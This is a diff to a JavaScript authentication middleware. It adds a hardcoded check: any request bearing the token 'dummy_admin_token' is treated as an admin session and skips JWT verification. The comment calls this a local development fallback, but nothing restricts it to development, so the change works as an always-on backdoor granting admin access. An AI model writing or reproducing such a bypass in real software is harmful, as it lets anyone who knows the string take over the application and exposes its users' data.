@@ -16,6 +16,12 @@ function verifyToken(req, res, next) {
     }
 
     const token = parts[1];
+    // Support a local development fallback token used by the frontend
+    // (e.g. when running the UI offline). Treat it as an admin session.
+    if (token === 'dummy_admin_token') {
+      req.user = { id: 0, role: 'admin', email: 'admin@example.com', name: 'Admin' };
+      return next();
+    }
     const decoded = jwt.verify(token, JWT_SECRET);
 
     // Your auth.js signs payload with { user: { id, role, ... } }
